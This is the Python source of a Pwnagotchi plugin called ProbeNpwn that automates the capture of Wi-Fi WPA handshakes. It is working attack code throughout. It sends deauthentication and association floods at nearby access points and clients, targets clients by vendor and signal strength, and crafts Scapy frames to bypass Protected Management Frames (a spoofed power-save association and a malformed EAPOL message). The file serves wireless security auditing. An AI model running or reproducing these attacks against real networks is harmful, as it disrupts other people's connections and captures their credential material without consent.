import logging
import time
import threading
import os
import subprocess
import random
import json
import math
import struct
from collections import OrderedDict, defaultdict
from concurrent.futures import ThreadPoolExecutor
from queue import PriorityQueue
import heapq
import bisect
import multiprocessing
try:
    import psutil
except ImportError:
    psutil = None

import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components

# Scapy for PMF bypass attacks
try:
    from scapy.all import RadioTap, Dot11, Dot11QoS, LLC, SNAP, EAPOL, sendp, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class ProbeNpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '1.7.1'
    __license__ = 'GPL3'
    __description__ = (
        'Aggressive handshake capture with adaptive/tactical/maniac modes, UCB1 channel hopping, '
        'vendor targeting, multi-band support (2.4/5/6 GHz), PMF bypass (Bad Msg & Assoc Sleep), '
        'JSON logging, persistent failure blacklist, dynamic scaling via mobility, and auto-Scapy install. '
        'Uses custom "pnp_status" element (tweakview-safe, no conflicts) with configurable position.'
    )

    MAX_RECENTS = 1000
    MAX_SCORES = 2000
    MAX_AP_CLIENTS = 1000
    MAX_AP_GROUPS = 1000
    MAX_CLIENTS_PER_AP = 100
    DELAY_CACHE_TTL_BASE = 5
    GPS_HISTORY_MAX_AGE = 300

    def __init__(self):
        logging.debug("ProbeNpwn v1.8.1 created")
        self.old_name = None
        self.recents = {}
        self.recent_heap = []
        self.executor = None
        self.executor_lock = threading.Lock()
        self._watchdog_thread = None
        self._watchdog_thread_running = True

        self.attack_attempts = {}
        self.success_counts = {}
        self.total_handshakes = 0

        self.channel_visits = defaultdict(int)
        self.total_channel_visits = 0
        self.channel_success = defaultdict(int)
        self.channel_activity = defaultdict(lambda: {"aps": 0, "clients": 0})

        self.whitelist = set()
        self.blacklist = {}  # ap_mac: expiry_time
        self.cooldowns = {}

        self.ap_clients = OrderedDict()
        self.client_scores = OrderedDict()
        self.ap_client_groups = OrderedDict()

        self.mode = "tactical"
        self.effective_mode = "tactical"

        self.retry_queue = PriorityQueue()
        self.handshake_db = set()  # (ap_mac, cl_mac)

        self.attacks_x = 10
        self.attacks_y = 20
        self.success_x = 10
        self.success_y = 30
        self.handshakes_x = 10
        self.handshakes_y = 40

        # Configurable custom status line position (pnp_status - tweakview-safe)
        self.pnp_status_x = 10
        self.pnp_status_y = 90

        self.ui_initialized = False
        self.last_ui_update = 0
        self.ui_update_interval = 5
        self.last_attempts = 0
        self.last_success_rate = 0.0
        self.last_handshakes = 0
        self.last_mobility = -1
        self.retry_counter = 0

        self.mobility_score = 0.0
        self.new_aps_per_epoch = 0
        self.epoch_count = 0
        self.env_check_interval = 10
        self.gps_history = []
        self.gps_history_size = 5

        self.min_recon_time = 2
        self.max_recon_time = 30
        self.min_ap_ttl = 30
        self.max_ap_ttl = 300
        self.min_sta_ttl = 30
        self.max_sta_ttl = 300
        self.min_deauth_prob = 0.9
        self.max_deauth_prob = 1.0
        self.min_assoc_prob = 0.9
        self.max_assoc_prob = 1.0
        self.min_min_rssi = -85
        self.max_min_rssi = -60
        self.min_throttle_a = 0.1
        self.max_throttle_a = 0.2
        self.min_throttle_d = 0.1
        self.max_throttle_d = 0.2

        self.enable_5ghz = False
        self.enable_6ghz = False
        self.possible_channels = list(range(1, 14))
        self.five_ghz_channels = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
        self.six_ghz_channels = [1, 5, 9, 13, 17, 21, 25, 29, 33, 37, 41, 45, 49, 53, 57, 61, 65, 69, 73, 77, 81, 85, 89, 93, 97, 101, 105, 109, 113, 117, 121, 125, 129, 133, 137, 141, 145, 149, 153, 157, 161, 165, 169, 173, 177, 181, 185, 189, 193, 197, 201, 205, 209, 213, 217, 221, 225, 229, 233]

        self.target_vendors = set()
        self.delay_cache = {}
        self.max_retries = 3

        self.restart_attempts = 0
        self.last_restart_time = 0
        self.max_restarts_per_hour = 3

        self.capture_log = "/root/handshakes/probenpwn_captures.jsonl"

        # PMF bypass
        self.scapy_available = SCAPY_AVAILABLE
        self.monitor_iface = "wlan0mon"
        self.enable_bad_msg = False
        self.enable_assoc_sleep = False
        self.scapy_install_attempted = False
        self.scapy_install_success = False

    def on_loaded(self):
        logging.info("ProbeNpwn v1.8.1 loaded")

        # Clear pycache
        pycache_path = "/usr/local/share/pwnagotchi/custom-plugins/__pycache__"
        if os.path.exists(pycache_path):
            try:
                for file in os.listdir(pycache_path):
                    os.remove(os.path.join(pycache_path, file))
                logging.info("Cleared pycache")
            except Exception as e:
                logging.warning(f"Failed to clear pycache: {e}")

        # Auto-install Scapy
        if not self.scapy_available:
            logging.warning("Scapy missing - attempting auto-install (needs internet)...")
            self.scapy_install_attempted = True
            try:
                result = subprocess.run(
                    ["pip3", "install", "--user", "scapy"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=180
                )
                if result.returncode == 0:
                    logging.info("Scapy installed! Restart Pwnagotchi.")
                    self.scapy_install_success = True
                    self.scapy_available = True
                else:
                    logging.error(f"Scapy install failed: {result.stderr.decode()}")
            except subprocess.TimeoutExpired:
                logging.error("Scapy install timeout")
            except Exception as e:
                logging.error(f"Scapy install error: {e}")
        else:
            logging.info("Scapy detected - PMF bypass ready.")

        self.executor = ThreadPoolExecutor(max_workers=self.get_dynamic_max_workers())

    def on_config_changed(self, config):
        self.whitelist = {item.lower() for item in config["main"].get("whitelist", [])}
        plugin_cfg = config["main"]["plugins"]["probenpwn"]

        self.verbose = plugin_cfg.get("verbose", False)
        logging.getLogger().setLevel(logging.DEBUG if self.verbose else logging.INFO)

        self.old_name = config.get("main", {}).get("name", "")

        self.mode = plugin_cfg.get("mode", "tactical").lower()
        if self.mode not in ["tactical", "maniac", "adaptive"]:
            self.mode = "tactical"
        self.effective_mode = "tactical" if self.mode == "adaptive" else self.mode

        self.attacks_x = plugin_cfg.get("attacks_x_coord", 10)
        self.attacks_y = plugin_cfg.get("attacks_y_coord", 20)
        self.success_x = plugin_cfg.get("success_x_coord", 10)
        self.success_y = plugin_cfg.get("success_y_coord", 30)
        self.handshakes_x = plugin_cfg.get("handshakes_x_coord", 10)
        self.handshakes_y = plugin_cfg.get("handshakes_y_coord", 40)

        # Custom pnp_status position (tweakview-safe, no core conflict)
        self.pnp_status_x = plugin_cfg.get("pnp_status_x_coord", 10)
        self.pnp_status_y = plugin_cfg.get("pnp_status_y_coord", 90)

        self.enable_5ghz = plugin_cfg.get("enable_5ghz", False)
        self.enable_6ghz = plugin_cfg.get("enable_6ghz", False)
        self.max_retries = plugin_cfg.get("max_retries", 3)
        self.gps_history_size = plugin_cfg.get("gps_history_size", 5)
        self.env_check_interval = plugin_cfg.get("env_check_interval", 10)

        self.target_vendors = {v.lower() for v in plugin_cfg.get("target_vendors", [])}

        self.enable_bad_msg = plugin_cfg.get("enable_bad_msg", False)
        self.enable_assoc_sleep = plugin_cfg.get("enable_assoc_sleep", False)

        # Scaling params
        self.min_recon_time = plugin_cfg.get("min_recon_time", 2)
        self.max_recon_time = plugin_cfg.get("max_recon_time", 30)
        self.min_ap_ttl = plugin_cfg.get("min_ap_ttl", 30)
        self.max_ap_ttl = plugin_cfg.get("max_ap_ttl", 300)
        self.min_sta_ttl = plugin_cfg.get("min_sta_ttl", 30)
        self.max_sta_ttl = plugin_cfg.get("max_sta_ttl", 300)
        self.min_deauth_prob = plugin_cfg.get("min_deauth_prob", 0.9)
        self.max_deauth_prob = plugin_cfg.get("max_deauth_prob", 1.0)
        self.min_assoc_prob = plugin_cfg.get("min_assoc_prob", 0.9)
        self.max_assoc_prob = plugin_cfg.get("max_assoc_prob", 1.0)
        self.min_min_rssi = plugin_cfg.get("min_min_rssi", -85)
        self.max_min_rssi = plugin_cfg.get("max_min_rssi", -60)
        self.min_throttle_a = plugin_cfg.get("min_throttle_a", 0.1)
        self.max_throttle_a = plugin_cfg.get("max_throttle_a", 0.2)
        self.min_throttle_d = plugin_cfg.get("min_throttle_d", 0.1)
        self.max_throttle_d = plugin_cfg.get("max_throttle_d", 0.2)

        self.possible_channels = list(range(1, 14))
        if self.enable_5ghz:
            self.possible_channels += self.five_ghz_channels
        if self.enable_6ghz:
            self.possible_channels += self.six_ghz_channels
        self.possible_channels = list(set(self.possible_channels))

        self.apply_scaling(config)

    def on_unload(self, ui):
        with ui._lock:
            if self.old_name:
                ui.set('name', f"{self.old_name}>")
            for elem in ['attacks', 'success', 'handshakes', 'mobility', 'pnp_status']:
                if ui.has_element(elem):
                    ui.remove_element(elem)
        self._watchdog_thread_running = False
        if self._watchdog_thread:
            self._watchdog_thread.join()
        with self.executor_lock:
            self.executor.shutdown(wait=True)
        logging.info("ProbeNpwn unloaded")

    def on_ui_setup(self, ui):
        if not self.ui_initialized:
            ui.add_element('attacks', components.Text(position=(self.attacks_x, self.attacks_y), value='Attacks: 0', color=255))
            ui.add_element('success', components.Text(position=(self.success_x, self.success_y), value='Success: 0.0%', color=255))
            ui.add_element('handshakes', components.Text(position=(self.handshakes_x, self.handshakes_y), value='Handshakes: 0', color=255))
            ui.add_element('mobility', components.Text(position=(self.handshakes_x, self.handshakes_y + 10), value='Mobility: 0%', color=255))
            # Custom pnp_status element (tweakview-safe, no core conflict)
            ui.add_element('pnp_status', components.Text(position=(self.pnp_status_x, self.pnp_status_y), value='Probe ready', color=255))
            self.ui_initialized = True

    def on_ui_update(self, ui):
        current_time = time.time()
        if current_time - self.last_ui_update < self.ui_update_interval:
            return

        total_attempts = sum(self.attack_attempts.values())
        total_successes = sum(self.success_counts.values())
        success_rate = (total_successes / total_attempts * 100) if total_attempts > 0 else 0.0
        mobility_pct = int(self.mobility_score * 100)

        update_needed = (
            total_attempts != self.last_attempts or
            abs(success_rate - self.last_success_rate) > 1.0 or
            self.total_handshakes != self.last_handshakes or
            mobility_pct != self.last_mobility
        )

        if update_needed:
            ui_changes = {
                'attacks': f"Attacks: {total_attempts}",
                'success': f"Success: {success_rate:.1f}%",
                'handshakes': f"Handshakes: {self.total_handshakes}",
                'mobility': f"Mobility: {mobility_pct}% ({self.effective_mode})"
            }
            with ui._lock:
                for key, value in ui_changes.items():
                    ui.set(key, value)

            self.last_attempts = total_attempts
            self.last_success_rate = success_rate
            self.last_handshakes = self.total_handshakes
            self.last_mobility = mobility_pct
            self.last_ui_update = current_time

    def on_ready(self, agent):
        logging.info("ProbeNpwn ready!")
        agent.run("wifi.clear")
        self._watchdog_thread = threading.Thread(target=self._watchdog, args=(agent,), daemon=True)
        self._watchdog_thread.start()

        status_msg = "Probe engaged..." if self.effective_mode == "tactical" else "Maniac mode!"
        if self.scapy_install_attempted:
            status_msg = "Scapy installed! Restart" if self.scapy_install_success else "Scapy install failed"
        elif not self.scapy_available:
            status_msg = "PMF disabled (no Scapy)"

        with agent._view._lock:
            agent._view.set('pnp_status', status_msg)

    def _watchdog(self, agent):
        CHECK_INTERVAL = 10
        MAX_RETRIES = 1
        retry_count = 0
        while self._watchdog_thread_running:
            if not os.path.exists("/sys/class/net/wlan0mon"):
                logging.error("wlan0mon missing! Recovering...")
                try:
                    subprocess.run(["monstop"], check=True, capture_output=True)
                    subprocess.run(["monstart"], check=True, capture_output=True)
                    logging.info("Recovery successful")
                    retry_count = 0
                except Exception as e:
                    logging.error(f"Recovery failed: {e}")
                    retry_count += 1

                if retry_count >= MAX_RETRIES:
                    current_time = time.time()
                    if current_time - self.last_restart_time > 3600:
                        self.restart_attempts = 0
                    if self.restart_attempts < self.max_restarts_per_hour:
                        delay = 2 ** self.restart_attempts
                        logging.info(f"Restarting in {delay}s")
                        time.sleep(delay)
                        subprocess.run(["systemctl", "restart", "pwnagotchi"], check=True)
                        self.restart_attempts += 1
                        self.last_restart_time = current_time
            else:
                retry_count = 0

            channel = self.select_channel()
            agent.set_channel(channel)
            self.channel_visits[channel] += 1
            self.total_channel_visits += 1

            new_workers = self.get_dynamic_max_workers()
            if new_workers != self.executor._max_workers:
                logging.info(f"Adjusting workers: {self.executor._max_workers} → {new_workers}")
                with self.executor_lock:
                    self.executor.shutdown(wait=True)
                    self.executor = ThreadPoolExecutor(max_workers=new_workers)

            time.sleep(CHECK_INTERVAL)

    def select_channel(self):
        channels = list(self.channel_activity.keys())
        if not channels:
            return random.choice(self.possible_channels)

        if self.total_channel_visits == 0:
            return random.choice(channels)

        ucb_values = {}
        log_total = math.log(max(1, self.total_channel_visits))
        for ch in channels:
            visits = self.channel_visits[ch]
            success = self.channel_success[ch]
            avg_reward = success / visits if visits > 0 else 0
            exploration = math.sqrt(2 * log_total / visits) if visits > 0 else float('inf')
            activity_bonus = (self.channel_activity[ch]["aps"] + self.channel_activity[ch]["clients"]) / 10
            ucb_values[ch] = avg_reward + exploration + activity_bonus

        return max(ucb_values, key=ucb_values.get)

    def track_recent(self, ap, cl=None):
        current_time = time.time()
        ap_mac = ap['mac'].lower()
        ap['_track_time'] = current_time
        self.recents[ap_mac] = ap
        heapq.heappush(self.recent_heap, (current_time, ap_mac))

        if cl:
            cl_mac = cl['mac'].lower()
            cl['_track_time'] = current_time
            self.recents[cl_mac] = cl
            heapq.heappush(self.recent_heap, (current_time, cl_mac))

    def ok_to_attack(self, agent, ap):
        ap_mac = ap['mac'].lower()
        ap_hostname = str(ap.get('hostname', '')).lower()

        if ap_hostname in self.whitelist or ap_mac in self.whitelist:
            return False
        if ap.get('rssi', -100) < self.get_scaled_param('min_rssi'):
            return False
        return True

    def get_dynamic_max_workers(self):
        try:
            if psutil:
                load = psutil.getloadavg()[0]
                cpus = psutil.cpu_count()
            else:
                load = os.getloadavg()[0]
                cpus = multiprocessing.cpu_count()
            base = cpus * 5
            if load > cpus * 0.8:
                return max(10, int(base * 0.5))
            elif load > cpus * 0.5:
                return int(base * 0.75)
            return base
        except Exception:
            return 20

    def calculate_mobility_score(self, agent):
        gps = agent.session().get('gps', None)
        current_time = time.time()
        speed_norm = 0.0
        if gps and 'Latitude' in gps and gps['Latitude'] != 0 and 'Longitude' in gps and gps['Longitude'] != 0:
            current_gps = {'Latitude': gps['Latitude'], 'Longitude': gps['Longitude']}
            while self.gps_history and current_time - self.gps_history[0][0] > self.GPS_HISTORY_MAX_AGE:
                self.gps_history.pop(0)
            self.gps_history.append((current_time, current_gps))
            if len(self.gps_history) > self.gps_history_size:
                self.gps_history.pop(0)
            speeds = []
            for i in range(1, len(self.gps_history)):
                prev_time, prev_gps = self.gps_history[i-1]
                curr_time, curr_gps = self.gps_history[i]
                time_delta = max(1, curr_time - prev_time)
                lat1, lon1 = math.radians(prev_gps['Latitude']), math.radians(prev_gps['Longitude'])
                lat2, lon2 = math.radians(curr_gps['Latitude']), math.radians(curr_gps['Longitude'])
                dlat, dlon = lat2 - lat1, lon2 - lon1
                a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
                c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
                distance_km = 6371 * c
                speed_kmh = (distance_km / time_delta) * 3600
                if speed_kmh < 200:
                    speeds.append(speed_kmh)
            if len(speeds) >= 2:
                median_speed = sorted(speeds)[len(speeds)//2]
                speed_norm = min(1.0, median_speed / 50.0)
        ap_rate_norm = min(1.0, self.new_aps_per_epoch / 20.0)
        return max(speed_norm, ap_rate_norm)

    def get_scaled_param(self, param_name):
        s = self.mobility_score
        if param_name == 'recon_time':
            return self.max_recon_time - s * (self.max_recon_time - self.min_recon_time)
        elif param_name == 'ap_ttl':
            return self.max_ap_ttl - s * (self.max_ap_ttl - self.min_ap_ttl)
        elif param_name == 'sta_ttl':
            return self.max_sta_ttl - s * (self.max_sta_ttl - self.min_sta_ttl)
        elif param_name == 'deauth_prob':
            return self.min_deauth_prob + s * (self.max_deauth_prob - self.min_deauth_prob)
        elif param_name == 'assoc_prob':
            return self.min_assoc_prob + s * (self.max_assoc_prob - self.min_assoc_prob)
        elif param_name == 'min_rssi':
            return self.min_min_rssi + s * (self.max_min_rssi - self.min_min_rssi)
        elif param_name == 'throttle_a':
            return self.max_throttle_a - s * (self.max_throttle_a - self.min_throttle_a)
        elif param_name == 'throttle_d':
            return self.max_throttle_d - s * (self.max_throttle_d - self.min_throttle_d)
        return 0.0

    def apply_scaling(self, config):
        params = ['recon_time', 'ap_ttl', 'sta_ttl', 'deauth_prob', 'assoc_prob', 'min_rssi', 'throttle_a', 'throttle_d']
        for param in params:
            if param in config['personality']:
                config['personality'][param] = self.get_scaled_param(param)
        logging.info(f"Applied scaling (mobility {self.mobility_score:.2f})")

    def dynamic_attack_delay(self, ap, cl):
        cl_mac = cl['mac'].lower() if cl else ''
        key = (ap['mac'].lower(), cl_mac)
        current_time = time.time()
        rssi = max(ap.get('rssi', -100), cl.get('rssi', -100) if cl else -100)
        ttl = 30 if rssi > -60 else 15 if rssi > -80 else 5
        if key in self.delay_cache and current_time - self.delay_cache[key][1] < ttl:
            return self.delay_cache[key][0]
        if self.effective_mode == "maniac":
            delay = 0.05
        else:
            base_delay = 0.1 if rssi >= -60 else 0.2
            attempts = self.attack_attempts.get(ap['mac'].lower(), 0)
            if attempts > 5:
                base_delay *= 0.4
            num_clients = self.ap_clients.get(ap['mac'].lower(), 0)
            if num_clients > 3:
                base_delay *= 0.8
            delay = base_delay * (0.95 + random.random() * 0.1)
        self.delay_cache[key] = (delay, current_time)
        return delay

    def is_pmf_protected(self, ap):
        return ap.get('mfpr', False)

    def assoc_sleep_attack(self, ap_mac, client_macs):
        if not client_macs or not self.scapy_available:
            return
        for cl_mac in client_macs[:8]:
            pkt = RadioTap() / Dot11(addr1=ap_mac, addr2=cl_mac, addr3=ap_mac, FCfield="to-DS+pwrmgt") / \
                  Dot11QoS() / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP()
            try:
                sendp(pkt, iface=self.monitor_iface, count=8, inter=0.1, verbose=0)
            except Exception as e:
                logging.debug(f"Assoc sleep failed: {e}")

    def bad_msg_attack(self, ap_mac, client_macs):
        if not client_macs or not self.scapy_available:
            return
        key_info = struct.pack(">H", 0x088a)
        payload = b'\x02' + key_info + b'\x00\x10' + b'\x00' * 93
        for cl_mac in client_macs[:8]:
            pkt = RadioTap() / Dot11(addr1=cl_mac, addr2=ap_mac, addr3=ap_mac) / \
                  LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP() / \
                  EAPOL(version=1, type=3, len=99) / Raw(load=payload)
            try:
                sendp(pkt, iface=self.monitor_iface, count=6, inter=0.15, verbose=0)
            except Exception as e:
                logging.debug(f"Bad msg failed: {e}")

    def attack_target(self, agent, ap, cl, retry_count=0):
        if retry_count > self.max_retries:
            return
        ap_mac = ap['mac'].lower()
        if ap_mac in self.blacklist and time.time() < self.blacklist[ap_mac]:
            return
        if self.effective_mode == "tactical":
            if ap_mac in self.cooldowns and time.time() < self.cooldowns[ap_mac]:
                return
            if cl and self.client_scores.get(cl['mac'].lower(), 0) < 50:
                self.retry_queue.put((time.time() + 30, self.retry_counter, (agent, ap, cl, retry_count + 1)))
                self.retry_counter += 1
                return
        if not self.ok_to_attack(agent, ap):
            return
        if cl and cl.get('rssi', -100) < self.get_scaled_param('min_rssi'):
            return
        agent.set_channel(ap['channel'])
        clients = self.ap_client_groups.get(ap_mac, [])
        client_data = [self.recents.get(c) for c in clients if c in self.recents]
        if cl:
            client_data = [cl] if cl['mac'].lower() in self.recents else []
        client_macs = [c['mac'].lower() for c in client_data if c]
        use_pmf = self.scapy_available and (self.enable_bad_msg or self.enable_assoc_sleep) and self.is_pmf_protected(ap)
        throttle_d = self.dynamic_attack_delay(ap, cl) * self.get_scaled_param('throttle_d')
        throttle_a = self.dynamic_attack_delay(ap, cl) * self.get_scaled_param('throttle_a')
        if use_pmf:
            logging.debug(f"PMF AP {ap_mac} → bypass")
            if self.enable_assoc_sleep:
                self.assoc_sleep_attack(ap_mac, client_macs)
            if self.enable_bad_msg:
                self.bad_msg_attack(ap_mac, client_macs)
        else:
            if agent._config['personality']['deauth'] and random.random() < self.get_scaled_param('deauth_prob'):
                for client in client_data:
                    self.executor.submit(agent.deauth, ap, client, throttle=throttle_d)
        num_clients = len(clients)
        assoc_prob = 1.0 if num_clients <= 1 else self.get_scaled_param('assoc_prob') * (0.4 if num_clients > 5 else 0.7)
        if random.random() < assoc_prob:
            self.executor.submit(agent.associate, ap, throttle=throttle_a)
        self.attack_attempts[ap_mac] = self.attack_attempts.get(ap_mac, 0) + 1

    def on_bcap_wifi_ap_new(self, agent, event):
        ap = event['data']
        ch = ap['channel']
        ap_mac = ap['mac'].lower()
        self.channel_activity[ch]["aps"] += 1
        self.new_aps_per_epoch += 1
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap)
            self.executor.submit(self.attack_target, agent, ap, None)

    def on_bcap_wifi_client_new(self, agent, event):
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        ch = ap['channel']
        self.channel_activity[ch]["clients"] += 1
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
        if len(self.ap_clients) > self.MAX_AP_CLIENTS:
            self.ap_clients.popitem(last=False)
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (self.ap_clients.get(ap_mac, 0) / 10)
        score_bonus = 100 if cl.get('vendor', '').lower() in self.target_vendors else 0
        new_score = max(0, self.client_scores.get(cl_mac, 0) * 0.95) + (signal + 100) * activity + score_bonus
        if cl_mac in self.client_scores and new_score > self.client_scores[cl_mac] + 20:
            self.client_scores.move_to_end(cl_mac)
        self.client_scores[cl_mac] = new_score
        if len(self.client_scores) > self.MAX_SCORES:
            self.client_scores.popitem(last=False)
        if cl_mac not in self.ap_client_groups.setdefault(ap_mac, []):
            self.ap_client_groups[ap_mac].append(cl_mac)
            if len(self.ap_client_groups[ap_mac]) > self.MAX_CLIENTS_PER_AP:
                self.ap_client_groups[ap_mac].pop(0)
        if len(self.ap_client_groups) > self.MAX_AP_GROUPS:
            self.ap_client_groups.popitem(last=False)
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap, cl)
            self.executor.submit(self.attack_target, agent, ap, cl)

    def on_handshake(self, agent, filename, ap, cl):
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower() if cl else ''
        key = (ap_mac, cl_mac)
        if key in self.handshake_db:
            return
        self.handshake_db.add(key)
        self.success_counts[ap_mac] = self.success_counts.get(ap_mac, 0) + 1
        self.channel_success[ap['channel']] += 1
        self.total_handshakes += 1
        if ap_mac in self.blacklist:
            del self.blacklist[ap_mac]
        if self.effective_mode == "tactical":
            self.cooldowns[ap_mac] = time.time() + 60
        # JSON log
        try:
            entry = {
                "time": time.time(),
                "ap_mac": ap['mac'],
                "essid": ap.get('hostname', ''),
                "client_mac": cl_mac if cl_mac else None,
                "file": filename
            }
            with open(self.capture_log, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            logging.warning(f"Failed to log capture: {e}")

    def on_epoch(self, agent, epoch, epoch_data):
        current_time = time.time()
        # Retries
        while not self.retry_queue.empty() and self.retry_queue.queue[0][0] <= current_time:
            _, _, args = self.retry_queue.get()
            self.executor.submit(self.attack_target, *args)
        # Cleanup
        while self.recent_heap and self.recent_heap[0][0] < current_time - 60:
            t, mac = heapq.heappop(self.recent_heap)
            if mac in self.recents and self.recents[mac]['_track_time'] == t:
                del self.recents[mac]
        # Blacklist failures
        for ap_mac in list(self.attack_attempts):
            attempts = self.attack_attempts[ap_mac]
            successes = self.success_counts.get(ap_mac, 0)
            if attempts > successes + 20 and ap_mac in self.recents:
                self.blacklist[ap_mac] = current_time + 3600
                logging.info(f"Blacklisted {ap_mac}")
        # Adaptive mode
        if self.mode == "adaptive" and self.epoch_count % 10 == 0:
            total_attempts = sum(self.attack_attempts.values())
            total_successes = sum(self.success_counts.values())
            success_rate = total_successes / max(1, total_attempts)
            density = sum(d["aps"] + d["clients"] for d in self.channel_activity.values())
            if success_rate < 0.2 and density > 30:
                self.effective_mode = "maniac"
            elif success_rate > 0.4 or density < 15:
                self.effective_mode = "tactical"
            logging.info(f"Adaptive: {self.effective_mode} (rate {success_rate:.2f})")
        # Mobility
        self.epoch_count += 1
        if self.epoch_count % self.env_check_interval == 0:
            self.mobility_score = self.calculate_mobility_score(agent)
            self.apply_scaling(agent._config)
            self.new_aps_per_epoch = 0

    def on_bcap_wifi_ap_updated(self, agent, event):
        ap = event['data']
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap)

    def on_bcap_wifi_client_updated(self, agent, event):
        ap = event['data']['AP']
        cl = event['data']['Client']
        ap_mac = ap['mac'].lower()
        cl_mac = cl['mac'].lower()
        self.ap_clients[ap_mac] = self.ap_clients.get(ap_mac, 0) + 1
        if len(self.ap_clients) > self.MAX_AP_CLIENTS:
            self.ap_clients.popitem(last=False)
        signal = cl.get('signal', -100)
        activity = cl.get('activity', 1) + (self.ap_clients.get(ap_mac, 0) / 10)
        score_bonus = 100 if cl.get('vendor', '').lower() in self.target_vendors else 0
        new_score = max(0, self.client_scores.get(cl_mac, 0) * 0.95) + (signal + 100) * activity + score_bonus
        if cl_mac in self.client_scores and new_score > self.client_scores[cl_mac] + 20:
            self.client_scores.move_to_end(cl_mac)
        self.client_scores[cl_mac] = new_score
        if len(self.client_scores) > self.MAX_SCORES:
            self.client_scores.popitem(last=False)
        if cl_mac not in self.ap_client_groups.setdefault(ap_mac, []):
            self.ap_client_groups[ap_mac].append(cl_mac)
            if len(self.ap_client_groups[ap_mac]) > self.MAX_CLIENTS_PER_AP:
                self.ap_client_groups[ap_mac].pop(0)
        if len(self.ap_client_groups) > self.MAX_AP_GROUPS:
            self.ap_client_groups.popitem(last=False)
        if self.ok_to_attack(agent, ap):
            self.track_recent(ap, cl)
